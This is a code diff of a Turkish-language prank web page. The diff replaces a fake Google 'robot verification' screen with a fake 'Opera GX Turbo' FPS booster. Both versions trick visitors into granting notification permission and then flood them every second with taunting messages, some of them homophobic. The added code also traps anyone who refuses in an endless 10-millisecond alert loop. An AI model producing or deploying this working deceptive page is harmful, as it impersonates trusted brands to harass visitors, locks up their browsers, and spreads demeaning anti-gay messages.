@@ -3,55 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Güvenlik Doğrulaması</title>
+    <title>Opera GX - Gaming SpeedUp</title>
     <style>
-        body { background: #fff; color: #202124; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .google-card { width: 90%; max-width: 400px; text-align: center; padding: 20px; border: 1px solid #dadce0; border-radius: 8px; }
-        .google-logo { width: 100px; margin-bottom: 20px; }
-        .btn-verify { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        body { background: #121212; color: #ff1b2d; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .gx-card { border: 2px solid #ff1b2d; padding: 40px; border-radius: 10px; background: #1a1a1a; box-shadow: 0 0 20px #ff1b2d; }
+        .btn-gx { background: #ff1b2d; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-    <div class="google-card">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo" alt="Google">
-        <h3>Robot Olmadığınızı Doğrulayın</h3>
-        <p>Devam etmek için bildirim iznini onaylayarak doğrulama kodunu alın.</p>
-        <button class="btn-verify" onclick="startVerification()">DOĞRULA</button>
+    <div class="gx-card">
+        <h1 style="margin-bottom:10px;">🔴 OPERA GX TURBO</h1>
+        <p>İnternet hızını ve FPS'i artırmak için bildirim izni verin.</p>
+        <button class="btn-gx" onclick="startOperaTroll()">TURBOYU AÇ</button>
     </div>
 
     <script>
-        function startVerification() {
-            // Tarayıcıdan izin iste
+        function startOperaTroll() {
+            // Opera'da bildirim izni isteme
+            if (!("Notification" in window)) {
+                // Eğer bildirim desteklenmiyorsa direk Alert Döngüsüne sokalım (Kaçış yok!)
+                launchAlertLoop();
+                return;
+            }
+
             Notification.requestPermission().then(function(permission) {
                 if (permission === "granted") {
-                    // İLK ŞOK: Hemen bir tane çak
-                    new Notification("✅ DOĞRULAMA BAŞARILI", {
-                        body: "Mobbing Modu Aktif Edildi. HAHAHA!",
-                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
-                    });
-
-                    // ASIL BOMBA: Saniyede bir (veya 10 saniyede bir) bildirim yağmuru
-                    // 1000 ms = 1 saniye (Hadi saniyede bir gelsin, telefon sussun istemiyoruz)
+                    // İzin gelirse saniyede bir dızt dızt!
                     setInterval(() => {
-                        const notifications = [
-                            "🚨 SİLSENE LAN!",
-                            "😏 HADİ SİL SİLEBİLİYORSAN!",
-                            "📱 TELEFONUNU ÇÖPE AT!",
-                            "🌈 BEN GAYIM - TÜM REHBERE GİTTİ!"
-                        ];
-                        const randomMsg = notifications[Math.floor(Math.random() * notifications.length)];
-                        
-                        new Notification(randomMsg, {
-                            body: "Ayarlar'da boşuna gezme, ben her yerdeyim!",
-                            tag: 'mobb' + Math.random() // Her bildirimin farklı görünmesi için şart
+                        new Notification("🚨 OPERA KRITIK HATA!", {
+                            body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
+                            icon: "https://upload.wikimedia.org/wikipedia/commons/e/e3/Opera_GX_Logo.png",
+                            tag: 'gx' + Math.random() // Her biri ayrı bildirim olarak düşsün
                         });
                     }, 1000); 
-
                 } else {
-                    alert("Doğrulama başarısız! Lütfen bildirimlere izin verin.");
+                    // İzin vermezse zorla Alert çıkarıyoruz
+                    launchAlertLoop();
                 }
             });
+        }
+
+        function launchAlertLoop() {
+            alert("TURBO MODU BAŞLATILAMADI!");
+            alert("GAY MODU AKTİF EDİLDİ! HAHAHA!");
+            setInterval(function() {
+                alert("SİLSENE LAN! HADİ SİL!");
+                alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ!");
+            }, 10); // 10ms'de bir alert patlatır
         }
     </script>
 </body>
